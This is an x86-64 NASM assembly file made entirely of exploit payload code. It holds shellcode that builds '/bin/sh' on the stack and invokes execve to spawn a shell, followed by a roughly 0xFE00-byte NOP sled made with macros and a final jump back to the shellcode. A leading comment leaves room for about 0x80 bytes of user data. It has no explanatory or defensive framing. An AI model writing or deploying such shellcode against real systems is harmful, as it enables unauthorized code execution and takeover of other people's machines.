; There are ~0x80 bytes that can go before this shellcode for user data

BITS 64

global start

start:
    push 0                    ; NULL
    mov rax, 0x68732f6e69622f
    push rax                  ; "/bin/sh"
    mov rdi, rsp
    push 0                    ; { NULL }
    push rdi                  ; {"/bin/sh", NULL}

    mov rsi, rsp
    mov rdx, rsp
    add rdx, 8

    mov rax, 59
    syscall

    mov rax, 60 ; sys exit
    mov rdi, 0
    syscall

; nop sled, we're bringing it back

%macro nop256 0
    dd 0x90909090,0x90909090,0x90909090,0x90909090
    dd 0x90909090,0x90909090,0x90909090,0x90909090
    dd 0x90909090,0x90909090,0x90909090,0x90909090
    dd 0x90909090,0x90909090,0x90909090,0x90909090
    dd 0x90909090,0x90909090,0x90909090,0x90909090
    dd 0x90909090,0x90909090,0x90909090,0x90909090
    dd 0x90909090,0x90909090,0x90909090,0x90909090
    dd 0x90909090,0x90909090,0x90909090,0x90909090
    dd 0x90909090,0x90909090,0x90909090,0x90909090
    dd 0x90909090,0x90909090,0x90909090,0x90909090
    dd 0x90909090,0x90909090,0x90909090,0x90909090
    dd 0x90909090,0x90909090,0x90909090,0x90909090
    dd 0x90909090,0x90909090,0x90909090,0x90909090
    dd 0x90909090,0x90909090,0x90909090,0x90909090
    dd 0x90909090,0x90909090,0x90909090,0x90909090
    dd 0x90909090,0x90909090,0x90909090,0x90909090
%endmacro

%macro nop0x1000 0
    nop256
    nop256
    nop256
    nop256
    nop256
    nop256
    nop256
    nop256
    nop256
    nop256
    nop256
    nop256
    nop256
    nop256
    nop256
    nop256
%endmacro

nop0x1000 ; 0x1000
nop0x1000 ; 0x2000
nop0x1000 ; 0x3000
nop0x1000 ; 0x4000
nop0x1000 ; 0x5000
nop0x1000 ; 0x6000
nop0x1000 ; 0x7000
nop0x1000 ; 0x8000
nop0x1000 ; 0x9000
nop0x1000 ; 0xA000
nop0x1000 ; 0xB000
nop0x1000 ; 0xC000
nop0x1000 ; 0xD000
nop0x1000 ; 0xE000
nop0x1000 ; 0xF000
nop256 ; 0xF100
nop256 ; 0xF200
nop256 ; 0xF300
nop256 ; 0xF400
nop256 ; 0xF500
nop256 ; 0xF600
nop256 ; 0xF700
nop256 ; 0xF800
nop256 ; 0xF900
nop256 ; 0xFA00
nop256 ; 0xFB00
nop256 ; 0xFC00
nop256 ; 0xFD00
nop256 ; 0xFE00

;0xFE28
jmp start